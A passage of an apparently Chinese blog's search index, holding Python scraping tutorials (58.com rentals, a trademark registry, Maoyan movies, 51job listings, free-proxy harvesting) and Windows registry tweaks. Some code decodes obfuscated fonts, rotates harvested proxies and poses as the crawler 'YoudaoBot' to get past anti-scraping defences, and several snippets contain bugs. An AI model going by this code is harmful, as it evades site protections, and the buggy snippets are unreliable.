data[&#x27;suspect&#x27;]])conn.commit()sql = &quot;select * from province&quot;cursor.execute(sql)datas = cursor.fetchall()china_sql = &#x27;select * from china_count&#x27;cursor.execute(china_sql)china_data = cursor.fetchone()# 地图map_obj = ( Map() .add(&quot;&quot;, datas, &quot;china&quot;) .set_global_opts( title_opts=opts.TitleOpts(title=&quot;疫情情况&quot;, subtitle=&quot;截止目前为止,全国共有累计确诊&#123;&#125;例,累计治愈&#123;&#125;例,累计死亡&#123;&#125;例,疑似&#123;&#125;例&quot; .format(china_data[0], china_data[1], china_data[2], china_data[3]) ), visualmap_opts=opts.VisualMapOpts(max_=3), ))name_list = [name[0] for name in datas]data_list = [name[1] for name in datas]# 柱状图bar_obj = ( Bar() .add_xaxis(name_list) .add_yaxis(&quot;各省份数据对比&quot;, data_list) .set_global_opts(title_opts=opts.TitleOpts(title=&quot;各省份目前情况&quot;), datazoom_opts=[opts.DataZoomOpts()] ))# page对象用于整合地图p = Page(layout=Page.SimplePageLayout)p.add(map_obj, bar_obj)p.render(&quot;疫情实时监控.html&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"win10去除/恢复桌面快捷方式下标","slug":"win10去除-恢复桌面快捷方式下标","date":"2020-10-12T06:05:43.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/12/win10去除-恢复桌面快捷方式下标/","permalink":"http://example.com/2020/10/12/win10%E5%8E%BB%E9%99%A4-%E6%81%A2%E5%A4%8D%E6%A1%8C%E9%9D%A2%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E4%B8%8B%E6%A0%87/","excerpt":"","text":"win10去除&#x2F;恢复桌面快捷方式下标去除123456reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons&quot; /v 29 /d &quot;%systemroot%\\system32\\imageres.dll,197&quot; /t reg_sz /ftaskkill /f /im explorer.exeattrib -s -r -h &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot;del &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot; /f /qstart explorerpause 恢复123456reg delete &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons&quot; /v 29 /ftaskkill /f /im explorer.exeattrib -s -r -h &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot;del &quot;%userprofile%\\AppData\\Local\\iconcache.db&quot; /f /qstart explorerpause","categories":[],"tags":[{"name":"win10","slug":"win10","permalink":"http://example.com/tags/win10/"}]},{"title":"58同城加密字体","slug":"58同城加密字体","date":"2020-10-10T10:40:12.000Z","updated":"2022-04-08T16:45:01.645Z","comments":true,"path":"2020/10/10/58同城加密字体/","permalink":"http://example.com/2020/10/10/58%E5%90%8C%E5%9F%8E%E5%8A%A0%E5%AF%86%E5%AD%97%E4%BD%93/","excerpt":"攻克加密字体的思路,详细代码","text":"攻克加密字体的思路,详细代码 58同城加密字体攻克加密字体的思路12341.分析网页,找到加密字体的字体文件2.对于加密字体,如果是base64编码的字符串,需要保存转换为二进制到woff文件中3.将字体转换为xml文件,用FontCreator软件观察字体,结合xml分析关系4.将编码替换为正常字体 找到加密字体文件 加密字体 发现规律 1可以看到code为0x958f这个编码对应的是数字3，对应的 name 编码是 glyph00004 1依然是 0x958f 这个编码，两次对应的 name 分别是 glyph00004 和 glyph00007，两次对应的数字分别是 3 和 6，那么结论就来了，每次发送请求，code 对应的 name 会随机发生变化，而 name 对应的数字不会发生变化，glyph00001 对应数字 0、glyph00002 对应数字 1 进行替换字体123456789101112131415161718192021222324252627282930313233343536373839404142&#x27;&#x27;&#x27;循环查找这十个 code 在 xml 文件里对应的 name 的值，然后将 name 的值与字典文件的 key 值进行对比，如果两者值相同，则获取这个 key 的 value 值，最终得到的列表 num_list，里面的元素就是 unicode_list 列表里面每个加密字体的真实值&#x27;&#x27;&#x27;def find_font(): # 以glyph开头的编码的对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换文字def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace(&#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace(&#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149import reimport requestsimport timeimport randomimport base64import pymysqlfrom lxml import etree#from Spider.ip_pool import Poolfrom fontTools.ttLib import TTFontheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#x27;&#125;#ips = Pool(10)#proxy = ips.offer_ip()#print(proxy)# 获取字体文件并转换为xml文件def get_font(page_url, page_num): #response = requests.get(url=page_url, headers=headers, proxies=proxy) response = requests.get(url=page_url, headers=headers) # 匹配 base64 编码的加密字体字符串 base64_string = response.text.split(&quot;base64,&quot;)[1].split(&quot;&#x27;&quot;)[0].strip() # print(base64_string) # 将 base64 编码的字体字符串解码成二进制编码 bin_data = base64.decodebytes(base64_string.encode()) # 保存为字体文件 with open(&#x27;58font.woff&#x27;, &#x27;wb&#x27;) as f: f.write(bin_data) print(&#x27;第&#x27; + str(page_num) + &#x27;次访问网页，字体文件保存成功！&#x27;) # 获取字体文件，将其转换为xml文件 font = TTFont(&#x27;58font.woff&#x27;) font.saveXML(&#x27;58font.xml&#x27;) print(&#x27;已成功将字体文件转换为xml文件！&#x27;) return response.text# 将加密字体编码与真实字体进行匹配def find_font(): # 以glyph开头的编码对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换掉网页中所有的加密字体编码def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace( &#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace( &#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) rooms = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;room&quot;]/text()&#x27;) address = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;infor&quot;]/a/text()&#x27;) # subway_rule = &#x27;&lt;/em&gt;(.*?) &lt;/p&gt;&#x27; # subway = re.findall(subway_rule, pages) price = ele.xpath(&#x27;//div[@class=&quot;money&quot;]/b/text()&#x27;) # print(title[0].split(&#x27;\\n&#x27;)[1].strip()) # print(rooms[0].replace(&#x27; &#x27;,&#x27;&#x27;)) # print(address[0]+&quot; &quot;+address[1]) # print(subway[0].replace(&#x27; &#x27;,&#x27;&#x27;)) # print(price) print(len(title)) for i in title: index = title.index(i) try: if title[index] ==&#x27;&#x27;: title[index] == &#x27;无&#x27; data = [title[index].split(&#x27;\\n&#x27;)[1].strip(), rooms[index].replace(&#x27; &#x27;, &#x27;&#x27;), address[index * 2] + &quot; &quot; + address[index * 2 + 1], price[index] + &#x27;元/月&#x27;, city] num += 1 except Exception as e: print(e) save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停2秒！&#x27;) time.sleep(2)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_data (title VARCHAR(100) PRIMARY KEY,rooms VARCHAR(255) NOT NULL, address VARCHAR(100) ,price VARCHAR(255),city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_data(title,rooms,address,price,city) values(%s, %s, %s, %s,%s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3], data[4])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: # create_mysql_table() # print(&#x27;MySQL表58tc_data创建成功！&#x27;) for i in range(1, 71): url = &#x27;https://bj.58.com/chuzu/pn&#x27; + str(i) + &#x27;/&#x27; response = get_font(url, i) num_list = find_font() pro_pages = replace_font(num_list, response) parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"商标网信息爬取","slug":"商标网信息爬取","date":"2020-10-09T08:47:27.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/09/商标网信息爬取/","permalink":"http://example.com/2020/10/09/%E5%95%86%E6%A0%87%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/","excerpt":"商标网信息爬取,网站http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html","text":"商标网信息爬取,网站http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html 商标网信息爬取123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import MySQLdbimport requestsnum = 1713n = 0url = &quot;http://wsgg.sbj.cnipa.gov.cn:9080/tmann/annInfoView/annSearchDG.html&quot;headers = &#123; &#x27;user-agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&#x27;&#125;for annnum in range(50): data = &#123; &#x27;page&#x27;:&#x27;1&#x27;, &#x27;rows&#x27;:&#x27;400000&#x27;, &#x27;annNum&#x27;:str(num), &#x27;annType&#x27;:&#x27;&#x27;, &#x27;tmType&#x27;:&#x27;&#x27;, &#x27;coowner&#x27;:&#x27;&#x27;, &#x27;recUserName&#x27;:&#x27;&#x27;, &#x27;allowUserName&#x27;:&#x27;&#x27;, &#x27;byAllowUserName&#x27;:&#x27;&#x27;, &#x27;appId&#x27;:&#x27;&#x27;, &#x27;appIdZhiquan&#x27;:&#x27;&#x27;, &#x27;bfchangedAgengedName&#x27;:&#x27;&#x27;, &#x27;changeLastName&#x27;:&#x27;&#x27;, &#x27;transferUserName&#x27;:&#x27;&#x27;, &#x27;acceptUserName&#x27;:&#x27;&#x27;, &#x27;regName&#x27;:&#x27;&#x27;, &#x27;tmName&#x27;:&#x27;&#x27;, &#x27;intCls&#x27;:&#x27;&#x27;, &#x27;fileType&#x27;:&#x27;&#x27;, &#x27;totalYOrN&#x27;:&#x27;true&#x27;, &#x27;appDateBegin&#x27;:&#x27;&#x27;, &#x27;appDateEnd&#x27;:&#x27;&#x27;, &#x27;agentName&#x27;:&#x27;&#x27;, &#125; num -= 1 print(data) res = requests.post(url,data=data,headers=headers).json() # 1.连接数据库 conn = MySQLdb.connect( host=&#x27;localhost&#x27;, port=3306, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27; ) cursor = conn.cursor() for i in res[&#x27;rows&#x27;]: try: # sql1 = &#x27;SELECT count(*) from brand1&#x27; # cursor.execute(sql1) # 2.准备sql语句 sql = &#x27;INSERT IGNORE INTO brand1 VALUES(%s,%s,%s)&#x27; # 3.执行sql cursor.execute(sql, [i[&#x27;tm_name&#x27;], i[&#x27;reg_num&#x27;], i[&#x27;reg_name&#x27;]]) conn.commit() n += 1 print(n) except Exception as e: print(f&#x27;存入数据失败，原因：&#123;e&#125;&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"自定义实现迭代器","slug":"自定义实现迭代器","date":"2020-10-05T04:29:25.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/05/自定义实现迭代器/","permalink":"http://example.com/2020/10/05/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E8%BF%AD%E4%BB%A3%E5%99%A8/","excerpt":"python自定义迭代器","text":"python自定义迭代器 python自定义迭代器的生成迭代器什么是迭代器12345iter(可迭代对象 )可以返回这个对象的的 迭代器实现了__iter__和__next__方法的对象都是迭代器对象迭代器对象是一个带状态的对象 __index记录当前迭代的位置迭代器也是一个可迭代对象,而可迭代对象不一定是迭代器 123456789101112131415#自定义实现迭代器class Stack: def __init__(self,*args): slef.__items = list(args) self.__index = 0 def __iter__(self): return self def __next__(self): if self.__index &lt; len(self.__items): item =self.__items[self.__index] self.__index +=1 return item else: raise StopIteration","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"爬取猫眼电影top100","slug":"爬取猫眼电影top100","date":"2020-09-29T07:18:45.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/09/29/爬取猫眼电影top100/","permalink":"http://example.com/2020/09/29/%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100/","excerpt":"使用ip代理爬取爬取猫眼电影top100","text":"使用ip代理爬取爬取猫眼电影top100 爬取猫眼电影top100123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import re, gzipfrom urllib import requestfrom lxml import etreenum = 0with open(&quot;ip.txt&quot;, &quot;r&quot;) as r: ips = r.readlines()for pn in range(0, 100, 10): url = &quot;https://maoyan.com/board/4?offset=&#123;&#125;&quot;.format(pn) headers = &#123; &#x27;user-agent&#x27;: &#x27;YoudaoBot&#x27;, &quot;referer&quot;: url, &#125; req = request.Request(url, headers=headers) for ip in ips: # 构建handler handler = request.ProxyHandler(eval(ip)) opener = request.build_opener(handler) res = opener.open(req).read().decode(&#x27;utf-8&#x27;) # 使用xpath匹配信息 ele = etree.HTML(res) # 匹配电影的url movie_url_list = ele.xpath(&#x27;//dl[@class=&quot;board-wrapper&quot;]/dd/a/@href&#x27;) # print(movie_url_list) # 拼接电影url new_movie_url = [&quot;https://maoyan.com&quot; + url for url in movie_url_list] # print(new_movie_url) for movie_url in new_movie_url: # print(movie_url) req1 = request.Request(movie_url, headers=headers) res1 = request.urlopen(req1).read() try: result1 = gzip.decompress(res1).decode(&#x27;utf-8&#x27;) except: result1 = res1.decode(&#x27;utf-8&#x27;) # print(result1) ele1 = etree.HTML(result1) movie_name = ele1.xpath(&#x27;//h1/text()&#x27;)[0] rule = &#x27;(.*?)\\n(.*?)\\n(.*?)\\n(.*?)&lt;li class=&quot;ellipsis&quot;&gt;(.*?)&lt;&#x27; movie_time = re.findall(rule, result1)[0][1][12:] movie_countries = re.findall(rule, result1)[0][0][8:] movie_grade = ele.xpath(&#x27;//i[@class=&quot;integer&quot;]/text()&#x27;)[0] + ele.xpath(&#x27;//i[@class=&quot;fraction&quot;]/text()&#x27;)[0] # print(movie_time,movie_countries,movie_grade) with open(&#x27;movie_top100.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as w: w.write(movie_name + &quot; &quot; + movie_countries + &quot; &quot; + movie_time + &quot; &quot; + movie_grade + &quot; \\n&quot;) num += 1 print(num) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768抓取免费高匿代理&#123;&#x27;http&#x27;: &#x27;125.108.71.122:9000&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;182.149.83.56:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;183.166.139.78:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.22.28:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;175.42.158.86:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;123.163.118.153:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;60.191.11.251:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;103.247.219.30:36295&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;114.109.162.18:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;118.25.40.151:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;113.252.222.73:8380&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.3.226:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;94.205.254.82:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;114.104.138.96:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;58.250.21.56:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;140.143.156.166:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;140.143.142.218:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;61.148.199.222:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;113.121.38.31:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;123.149.137.44:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;116.62.204.38:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;222.175.171.6:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.157:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.31:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.140:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.114:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.21:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.113:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.141:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.107:13084&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.159:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.77.61.153:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.146:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.86:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.233.109:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.87:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;46.101.140.93:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.118:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;115.53.34.149:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.157:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.31:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;110.243.3.226:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.63.140:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;118.24.172.149:1080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.114:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.21:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;106.110.212.165:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;95.0.66.69:8080&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.113:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;171.35.170.212:9999&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;105.27.237.28:80&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.107:13084&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.232.95:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.141.159:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;115.218.214.35:9000&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.77.61.153:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.146:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.86:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.233.109:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;51.83.231.23:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;46.101.140.93:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.118:10223&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.84.148:8800&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;54.38.51.134:3128&#x27;&#125;&#123;&#x27;http&#x27;: &#x27;165.225.32.106:10223&#x27;&#125;","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Clawer-爬虫采集免费的代理","slug":"Clawer-采集免费的代理","date":"2020-09-28T01:00:25.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/28/Clawer-采集免费的代理/","permalink":"http://example.com/2020/09/28/Clawer-%E9%87%87%E9%9B%86%E5%85%8D%E8%B4%B9%E7%9A%84%E4%BB%A3%E7%90%86/","excerpt":"Clawer-爬虫采集免费的代理,并测试代理是否可用","text":"Clawer-爬虫采集免费的代理,并测试代理是否可用 Clawer-爬虫采集免费的代理12345678910111213141516171819202122232425262728293031323334353637383940# # _*_coding:UTF-8 _*_# 采集代理import refrom urllib import requestfrom lxml import etree#测试地址test_url = &quot;http://www.httpbin.org/ip&quot;local_ip = request.urlopen(test_url).read().decode()url = &quot;https://ip.jiangxianli.com/blog.html&quot;res = request.urlopen(url).read().decode(&#x27;utf-8&#x27;)# with open(&#x27;ip.html&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as w:# w.write(res)ele = etree.HTML(res)char_url_list = ele.xpath(&#x27;//h3/a/@href&#x27;)for char_url in char_url_list: res1 = request.urlopen(char_url).read().decode(&#x27;utf-8&#x27;) rule = &#x27;&lt;p&gt;(.*?)&lt;/p&gt;&#x27; ip_port_list = re.findall(rule, res) for i in ip_port_list[1:]: ip_port = i.split(&#x27;@HTTP&#x27;)[0] ip_port1 = ip_port.lstrip() # print(ip_port1) # 拼接对应的代理格式 dict1 = &#123;&#125; dict1[&#x27;http&#x27;] = ip_port1 print(&quot;开始测试代理&#123;&#125;&quot;.format(dict1)) # 构建代理handler proxy_handler = request.ProxyHandler(dict1) opener = request.build_opener(proxy_handler) try: now_ip = opener.open(test_url, timeout=4).read().decode() if now_ip != local_ip: print(&quot;代理可以用:&#123;&#125;&quot;.format(dict1)) with open(&quot;ip.txt&quot;, &quot;a&quot;) as w: w.write(str(dict1) + &quot;\\n&quot;) print(&quot;写入ip&#123;&#125;&quot;.format(dict1)) except: pass 测试代理1234567891011121314151617181920# 测试代理from urllib import requesttest_url = &quot;http://www.httpbin.org/ip&quot;local_ip = request.urlopen(test_url).read().decode()with open(&#x27;ip.txt&#x27;, &#x27;r&#x27;) as r: ips = r.readlines()for ip in ips: proxy_handler = request.ProxyHandler(eval(ip)) opener = request.build_opener(proxy_handler) try: now_ip = opener.open(test_url, timeout=4).read().decode() if now_ip != local_ip: print(&quot;代理可以用&#123;&#125;&quot;.format(ip)) with open(&#x27;ip1.txt&#x27;, &#x27;a&#x27;) as w: w.write(str(ip) + &quot;\\n&quot;) except: pass","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Clawer-51job爬取","slug":"Clawer-51job爬取","date":"2020-09-27T02:55:14.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/09/27/Clawer-51job爬取/","permalink":"http://example.com/2020/09/27/Clawer-51job%E7%88%AC%E5%8F%96/","excerpt":"简单的51job爬取五万条职位信息,正则匹配数据,以及json处理数据","text":"简单的51job爬取五万条职位信息,正则匹配数据,以及json处理数据 Clawer-51job爬取简单的51job爬取五万条职位信息 正则匹配数据 12345678910111213141516171819202122232425262728293031323334import gzip,refrom urllib import requestnum = 0for pn in range(1, 1462): url = &quot;https://search.51job.com/list/000000,000000,0000,00,9,99,java,2,&#123;&#125;.html&quot;.format(pn) headers = &#123; &#x27;user-agent&#x27;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20101101 Firefox/6.0&quot;, &#x27;referer&#x27;: &#x27;url&#x27;&#125; # &#x27;user-agent&#x27;: &quot;baiduSpider&quot;&#125; req = request.Request(url) res = request.urlopen(req).read() try: res = gzip.decompress(res).decode(&#x27;gbk&#x27;) except: res = res.decode(&#x27;gbk&#x27;) jpb_name_rule = &#x27;&quot;job_title&quot;:&quot;(.*?)&quot;&#x27; jpb_conmoany_rule = &#x27;&quot;company_name&quot;:&quot;(.*?)&quot;&#x27; jpb_salary_rule = &#x27;&quot;providesalary_text&quot;:&quot;(.*?)&quot;&#x27; jpb_place_rule = &#x27;&quot;workarea_text&quot;:&quot;(.*?)&quot;&#x27; job_names = re.findall(jpb_name_rule,res) job_company = re.findall(jpb_conmoany_rule,res) job_salary = re.findall(jpb_salary_rule,res) job_place = re.findall(jpb_place_rule,res) with open(&#x27;51job.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as w: for job_name in job_names: index = job_name.index(job_name) w.write(job_name + &quot; &quot; + job_company[index] + &quot; &quot; + job_salary[index]+ &quot; &quot; + job_place[index] + &quot; &quot; + &quot;\\n&quot;) num += 1 if num == 50000: break print(num) json处理数据123456789101112131415import jsonimport refrom urllib import requestfor i in range(1, 6): url = 